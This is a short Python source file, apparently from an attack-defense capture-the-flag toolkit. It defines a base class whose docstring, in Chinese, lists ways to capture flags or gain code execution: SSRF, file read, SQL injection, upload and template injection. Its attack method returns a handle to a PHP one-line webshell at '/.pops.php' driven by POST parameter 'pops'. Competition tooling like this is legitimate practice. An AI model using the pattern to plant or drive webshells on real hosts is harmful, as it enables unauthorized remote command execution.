from webshell.shell3 import Shell3
class WebBase():
    '''
    攻击类需要实现attack(ip:str)->tuple:
    一种是通过ssrf、任意文件读、sql注入拿到直接拿到flag，
    一种是通过文件上传、模版注入的方式达到的任意代码执行（php）和任意命令执行（shell）
    
    
    attack(ip):webshell,flag
    '''
    def attack(self,ip:str)->tuple:
        return (Shell3('http://{}/.pops.php'.format(ip),'POST','pops'),'')  #攻击结束，返回一个post一句话木马